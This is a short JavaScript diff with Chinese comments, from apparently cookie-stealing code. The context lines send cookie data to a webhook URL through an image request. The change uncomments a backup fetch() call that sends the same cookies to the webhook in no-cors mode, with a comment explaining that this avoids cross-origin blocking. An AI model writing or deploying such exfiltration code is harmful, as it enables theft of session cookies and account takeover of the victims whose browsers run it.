@@ -9,8 +9,7 @@ var img = new Image();
 img.src = webhookUrl + "?cookie=" + encodeURIComponent(cookieData);
 
 // 方法 2：或者使用 fetch 发送请求 (备用)
-/*
 fetch(webhookUrl + "?cookie=" + encodeURIComponent(cookieData), {
     mode: 'no-cors' // 声明 no-cors 防止浏览器因跨域拦截请求
 });
-*/
+
